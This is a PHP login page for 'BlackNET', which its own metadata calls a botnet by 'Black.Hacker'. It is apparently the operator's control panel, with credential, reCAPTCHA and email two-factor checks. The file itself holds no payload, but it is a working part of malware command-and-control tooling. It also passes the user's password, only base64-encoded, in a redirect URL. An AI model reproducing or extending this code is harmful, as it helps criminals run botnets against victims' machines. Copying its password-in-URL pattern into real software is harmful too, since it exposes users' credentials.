<?php
  include 'classes/Database.php';
  include 'classes/Settings.php';
  include 'classes/User.php';
  include 'classes/Auth.php';
  include 'classes/Mailer.php';
   
   $settings = new Settings;
   $auth = new Auth;
   $getSettings = $settings->getSettings(1);
   if ($_SERVER['REQUEST_METHOD'] == "POST") {
      $username = htmlspecialchars($_POST['username'],ENT_QUOTES, 'UTF-8');
      $password = htmlspecialchars($_POST['password'],ENT_QUOTES, 'UTF-8');
      $loginstatus = $auth->newLogin($username,$password);
     if ($loginstatus == 200) {
        $_SESSION['last_action'] = time();
        if(isset($_POST['g-recaptcha-response'])){
          $response = $auth->recaptchaResponse($getSettings->recaptchaprivate,$_POST['g-recaptcha-response']);
          if (!$response->success) {
            $error = "Robot verification failed, please try again.";
          }
        }

        if (!isset($error)) {
         if ($auth->isTwoFAEnabled($username) == "on") {
           if ($auth->newCode($username,$auth->generateString(6,"0123456789")) == true){
             $settings->redirect("auth.php?username=$username&password=".base64_encode($password));
           } else {
             $error = "We couldn't send an email.";
           }
         } else {
          $_SESSION['login_user'] = $username;
          $_SESSION['login_password'] = hash("sha256", $auth->salt.$password);
          $settings->redirect("index.php");
         }
        }

     } elseif ($loginstatus == 403) {
          $error = "Access denied you are not admin.";
       } elseif ($loginstatus == 500) {
         $error = "Username or Password is incorrect.";
       } 
   }
?>

<?php if (file_exists("install.php")) : ?>
  <h1 style='text-align:center; color:#c0392b; font-family:arial;'>Please Remove install.php</h1>
  <footer style='text-align:center; color:#c0392b; font-family:arial;'>Coded by: Black.Hacker</footer>
<?php die(); ?>
<?php endif; ?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
    <title>BlackNET - Login</title>
    <link rel="shortcut icon" href="favico.png">
    <link href="asset/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="asset/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="asset/css/sb-admin.css" rel="stylesheet">
  </head>
  <body class="bg-dark">
    <div class="container">
      <div class="card card-login mx-auto mt-5">
        <div class="card-header">Login</div>
        <div class="card-body">
          <form method="POST">
            <?php if (isset($error)): ?>
               <div class="alert alert-danger">
                <span class="fa fa-times-circle"></span> <?php echo $error ?>
               </div>
            <?php endif; ?>

            <?php if (isset($_GET['msg'])): ?>
               <div class="alert alert-success">
                <span class="fa fa-check-circle"></span> Data Has Been Updated, Login Again.
               </div>
            <?php endif;?>
            
            <div class="form-group">
              <div class="form-label-group">
                <input type="text" id="username" class="form-control" name="username" placeholder="Username" required="required" autofocus="autofocus">
                <label for="username">Username</label>
              </div>
            </div>
            <div class="form-group">
              <div class="form-label-group">
                <input type="password" id="password" name="password" class="form-control" placeholder="Password" required="required">
                <label for="password">Password</label>
              </div>
            </div>
            <div class="align-content-center text-center">
            <?php if ($getSettings->recaptchastatus == "off"): ?>
                    <div class="alert alert-primary">
                      <span class="fa fa-info-circle"></span> <b>reCAPTCHA</b> is not enabled.
                    </div>
            <?php else: ?>
                  <div class="form-group">
                    <div class="g-recaptcha" data-sitekey="<?php echo $getSettings->recaptchapublic; ?>" required></div>
                  </div>';
           <?php endif; ?>
            </div>
            <button type="submit" class="btn btn-primary btn-block">Login</button>
          </form>
        <div class="text-center">
          <a class="d-block small mt-3" href="forgot-password.php">Forgot Password?</a>
        </div>
        </div>
      </div>
    </div>
    <script src="asset/vendor/jquery/jquery.min.js"></script>
    <script src="asset/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="asset/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src='https://www.google.com/recaptcha/api.js'></script>

  </body>

</html>
